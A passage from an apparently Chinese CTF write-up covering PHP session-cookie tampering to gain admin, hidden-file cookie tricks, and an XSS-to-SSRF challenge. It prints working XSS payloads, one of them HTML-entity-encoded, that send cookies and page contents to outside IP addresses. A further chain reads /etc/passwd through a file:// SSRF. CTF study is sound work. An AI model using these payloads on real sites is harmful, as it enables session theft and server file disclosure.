class="hljs-number">3</span>A<span class="hljs-number">14</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Session%<span class="hljs-number">00</span>debug%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">19</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Session%<span class="hljs-number">00</span>debug_dump%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">9</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>index.php%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">13</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">00</span>Session%<span class="hljs-number">00</span>data%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Ba%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">7</span>B%<span class="hljs-number">7</span>Ds%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>user%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">4</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>pass%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">0</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bs%<span class="hljs-number">3</span>A<span class="hljs-number">8</span>%<span class="hljs-number">3</span>A%<span class="hljs-number">22</span>is_admin%<span class="hljs-number">22</span>%<span class="hljs-number">3</span>Bb%<span class="hljs-number">3</span>A<span class="hljs-number">1</span>%<span class="hljs-number">3</span>B%<span class="hljs-number">7</span>D</code></pre><p>即把最后一个零改成1</p><p>编码得到新的login8sha512：</p><pre><code class="hljs llvm"><span class="hljs-number">1</span>bfca<span class="hljs-number">86</span>fbcfe<span class="hljs-number">7</span>d<span class="hljs-number">9</span>ece<span class="hljs-number">7</span>d<span class="hljs-number">7566</span>b<span class="hljs-number">160</span>a<span class="hljs-number">7</span>a<span class="hljs-number">351894</span>d<span class="hljs-number">0420827</span>db<span class="hljs-number">36</span>f<span class="hljs-number">87021e8</span>debf<span class="hljs-number">4</span>b<span class="hljs-number">728</span>cfd<span class="hljs-number">5</span>accb<span class="hljs-number">8785</span>d<span class="hljs-number">7e812</span>f<span class="hljs-number">2774e5924</span>adf<span class="hljs-number">0753</span>edd<span class="hljs-number">9</span>d<span class="hljs-number">53e7</span><span class="hljs-keyword">c</span><span class="hljs-number">2</span>f<span class="hljs-number">161209028</span>f<span class="hljs-number">28</span><span class="hljs-keyword">add</span></code></pre><p>获得flag</p><ol start="30"><li><p>和上一题相同的方法把debug_dump改成1，打开发现和source的一模一样…</p><p>看了giraff3的解答，要修改<code>debug_dump</code>为<code>config.php</code>,并且需要修改其前面的数值，该数值代表这一字符串长度。此时则可以读取<code>config.php</code>源码，发现flag2</p></li></ol><ol start="31"><li><p>打开题目是一个登录的界面，用guest试试</p><p>登陆后发现有好多文件，看到一个文件叫‘see-me-if-you-need-tips’，当然需要，打开看看：</p><pre><code class="hljs n1ql">Do you know cookie? <span class="hljs-keyword">Create</span> a cookie named <span class="hljs-symbol">`help`</span> <span class="hljs-keyword">with</span> <span class="hljs-keyword">value</span> <span class="hljs-symbol">`me`</span>!</code></pre><p>于是抓包，但是发现了：<code>show_hidden=no</code></p><p>改成yes</p><p>发现good.job.here.is.your.hidden.flag-1.txt</p></li></ol><ol start="32"><li><p>题目告诉我们用admin登录会获得flag2</p></li><li><p>xssme：</p><p><a href="https://blog.csdn.net/weixin_34082789/article/details/93108302">https://blog.csdn.net/weixin_34082789/article/details/93108302</a></p></li></ol><p>html实体编码对照：</p><p><a href="https://dev.w3.org/html5/html-author/charref">https://dev.w3.org/html5/html-author/charref</a></p><p>svgxss：<a href="https://www.hackersb.cn/hacker/85.html">https://www.hackersb.cn/hacker/85.html</a></p><p>xss坑：<a href="http://www.0xby.com/1486.html">http://www.0xby.com/1486.html</a></p><p>本来以为验证码要跑，结果多点几次 I‘m a robot 就出来了</p><p>html实体编码: <a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">https://www.qqxiuzi.cn/bianma/zifushiti.php</a></p><p>payload：</p><pre><code class="hljs javascript">&lt;svg/onload=<span class="hljs-string">&quot;document.location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(document.cookie)&quot;</span>&gt;     <span class="hljs-comment">//btoa是base64编码</span></code></pre><p>拿去html实体编码：</p><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">svg</span>/<span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;<span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6D;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x2E;</span><span class="hljs-symbol">&amp;#x6C;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x3D;</span><span class="hljs-symbol">&amp;#x27;</span><span class="hljs-symbol">&amp;#x68;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x70;</span><span class="hljs-symbol">&amp;#x3A;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x34;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x2E;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x37;</span><span class="hljs-symbol">&amp;#x2E;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x33;</span><span class="hljs-symbol">&amp;#x35;</span><span class="hljs-symbol">&amp;#x2E;</span><span class="hljs-symbol">&amp;#x31;</span><span class="hljs-symbol">&amp;#x38;</span><span class="hljs-symbol">&amp;#x32;</span><span class="hljs-symbol">&amp;#x3A;</span><span class="hljs-symbol">&amp;#x38;</span><span class="hljs-symbol">&amp;#x30;</span><span class="hljs-symbol">&amp;#x2F;</span><span class="hljs-symbol">&amp;#x3F;</span><span class="hljs-symbol">&amp;#x27;</span><span class="hljs-symbol">&amp;#x2B;</span><span class="hljs-symbol">&amp;#x62;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x61;</span><span class="hljs-symbol">&amp;#x28;</span><span class="hljs-symbol">&amp;#x64;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x75;</span><span class="hljs-symbol">&amp;#x6D;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x6E;</span><span class="hljs-symbol">&amp;#x74;</span><span class="hljs-symbol">&amp;#x2E;</span><span class="hljs-symbol">&amp;#x63;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6F;</span><span class="hljs-symbol">&amp;#x6B;</span><span class="hljs-symbol">&amp;#x69;</span><span class="hljs-symbol">&amp;#x65;</span><span class="hljs-symbol">&amp;#x29;</span>&quot;</span>&gt;</span></code></pre><p>打到服务器上，base64解码：</p><p><img src="C:\Users\y\AppData\Roaming\Typora\typora-user-images\image-20200616235959926.png" alt="image-20200616235959926"></p><h3 id="xssrf-leak"><a href="#xssrf-leak" class="headerlink" title="xssrf leak"></a>xssrf leak</h3><p>http头绕过</p><pre><code class="hljs yaml"><span class="hljs-attr">X-Forwarded-For:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-attr">X-Client-IP:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><span class="hljs-attr">Client-IP:</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span></code></pre><p>payload：</p><pre><code class="hljs awk">&lt;svg<span class="hljs-regexp">/onload=&quot;document.location=&#x27;http:/</span><span class="hljs-regexp">/123.207.14.45:7777/</span>?<span class="hljs-string">&#x27;+btoa(document.body.innerHTML)&quot;&gt;</span></code></pre><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php&quot;</span>&gt;</span>XSSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-nav&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sendmail.php&quot;</span>&gt;</span>Send Mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailbox.php&quot;</span>&gt;</span>Mailbox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sentmail.php&quot;</span>&gt;</span>Sent Mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;setadmin.php&quot;</span>&gt;</span>Set Admin<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;request.php&quot;</span>&gt;</span>Send Request<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-nav ml-auto&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-text&quot;</span>&gt;</span>Hello, admin (Administrator)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;logout.php&quot;</span>&gt;</span>Logout<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card text-white bg-dark&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card-body&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card-title&quot;</span>&gt;</span>            hh          <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">h4</span>&gt;</span>From: <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sendmail.php?to=456a&quot;</span>&gt;</span>456a<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">h4</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;card-text&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">svg</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;document.location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(document.body.innerHTML)&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">svg</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>  </code></pre><p>直接利用xss去本地访问，再将页面内容打出来</p><p>解码后保存到本地html里打开<br>发现多了一个send request的功能，跟过去看代码</p><p>没错，是多了一个request.php</p><p>这段代码显然是admin才拥有的</p><p>那么结合题目意思，应该是有ssrf，我想应该就是利用这里的request.php了吧<br>那么继续去读这个页面的html</p><p>结合之前获取到到信息，这个request.php有个表单可以提交url参数，结合题目的ssrf，这个request功能很可能是拿 <strong>curl</strong> 写的，如果这样，我们就可以用 <strong>file协议</strong> 读系统的文件了。读什么文件呢？卡了一会，最后扫目录发现robots.txts</p><pre><code class="hljs nix">&lt;svg/<span class="hljs-attr">onload=&quot;</span><span class="hljs-attr">xmlhttp=new</span> XMLHttpRequest();xmlhttp.<span class="hljs-attr">onreadystatechange=function()</span>&#123;    <span class="hljs-keyword">if</span> (xmlhttp.<span class="hljs-attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="hljs-attr">status==200)</span>    &#123;       document.<span class="hljs-attr">location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(xmlhttp.responseText);</span>    &#125;&#125;xmlhttp.open(<span class="hljs-string">&quot;GET&quot;</span>,<span class="hljs-string">&quot;request.php&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.send();<span class="hljs-string">&quot;&gt;</span></code></pre><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>XSSRF - Request<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;bootstrap/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;style.css&quot;</span> <span class="hljs-attr">media</span>=<span class="hljs-string">&quot;all&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css"><span class="hljs-selector-tag">pre</span> &#123; <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#eee</span>; <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>; &#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">nav</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;index.php&quot;</span>&gt;</span>XSSRF<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-nav&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sendmail.php&quot;</span>&gt;</span>Send Mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;mailbox.php&quot;</span>&gt;</span>Mailbox<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;sentmail.php&quot;</span>&gt;</span>Sent Mail<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;setadmin.php&quot;</span>&gt;</span>Set Admin<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;request.php&quot;</span>&gt;</span>Send Request<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">ul</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-nav ml-auto&quot;</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;navbar-text&quot;</span>&gt;</span>Hello, admin (Administrator)<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;logout.php&quot;</span>&gt;</span>Logout<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">nav</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;container&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;/request.php&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-group&quot;</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">label</span> <span class="hljs-attr">for</span>=<span class="hljs-string">&quot;url&quot;</span>&gt;</span>URL<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>          <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;form-control&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">aria-describedby</span>=<span class="hljs-string">&quot;url&quot;</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">&quot;URL&quot;</span> <span class="hljs-attr">rows</span>=<span class="hljs-string">&quot;10&quot;</span>&gt;</span></code></pre><p>试着读取/etc/passwd</p><pre><code class="hljs nix">&lt;svg/<span class="hljs-attr">onload=&quot;</span><span class="hljs-attr">xmlhttp=new</span> XMLHttpRequest();xmlhttp.<span class="hljs-attr">onreadystatechange=function()</span>&#123;    <span class="hljs-keyword">if</span> (xmlhttp.<span class="hljs-attr">readyState==4</span> &amp;&amp; xmlhttp.<span class="hljs-attr">status==200)</span>    &#123;       document.<span class="hljs-attr">location=&#x27;http://45.77.135.182:80/?&#x27;+btoa(xmlhttp.responseText);</span>    &#125;&#125;xmlhttp.open(<span class="hljs-string">&quot;POST&quot;</span>,<span class="hljs-string">&quot;request.php&quot;</span>,<span class="hljs-literal">true</span>);xmlhttp.setRequestHeader(<span class="hljs-string">&quot;Content-type&quot;</span>,<span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>);xmlhttp.send(<span class="hljs-string">&quot;url=file:///etc/passwd&quot;</span>);<span class="hljs-string">&quot;&gt;</span></code></pre><pre><code class="hljs gradle">&lt;!DOCTYPE html&gt;&lt;html lang=<span class="hljs-string">&quot;en&quot;</span>&gt;  &lt;head&gt;    &lt;meta charset=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;    &lt;title&gt;XSSRF - Request&lt;/title&gt;    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;bootstrap/css/bootstrap.min.css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;    &lt;link rel=<span class="hljs-string">&quot;stylesheet&quot;</span> href=<span class="hljs-string">&quot;style.css&quot;</span> media=<span class="hljs-string">&quot;all&quot;</span>&gt;    &lt;style&gt;pre &#123; background-color: #eee; padding: <span class="hljs-number">5</span>px; &#125;&lt;/style&gt;  &lt;/head&gt;  &lt;body&gt;&lt;nav <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;navbar navbar-expand-lg navbar-dark bg-dark d-flex&quot;</span>&gt;  &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;navbar-brand&quot;</span> href=<span class="hljs-string">&quot;index.php&quot;</span>&gt;XSSRF&lt;/a&gt;  &lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;navbar-nav&quot;</span>&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;sendmail.php&quot;</span>&gt;Send Mail&lt;/a&gt;    &lt;/li&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;mailbox.php&quot;</span>&gt;Mailbox&lt;/a&gt;    &lt;/li&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;sentmail.php&quot;</span>&gt;Sent Mail&lt;/a&gt;    &lt;/li&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;setadmin.php&quot;</span>&gt;Set Admin&lt;/a&gt;    &lt;/li&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span class="hljs-string">&quot;request.php&quot;</span>&gt;Send Request&lt;/a&gt;    &lt;/li&gt;  &lt;/ul&gt;  &lt;ul <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;navbar-nav ml-auto&quot;</span>&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;span <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;navbar-text&quot;</span>&gt;Hello, admin (Administrator)&lt;/span&gt;    &lt;/li&gt;    &lt;li <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-item&quot;</span>&gt;      &lt;a <span class="hljs-keyword">class</span>=<span class="hljs-string">&quot;nav-link&quot;</span> href=<span 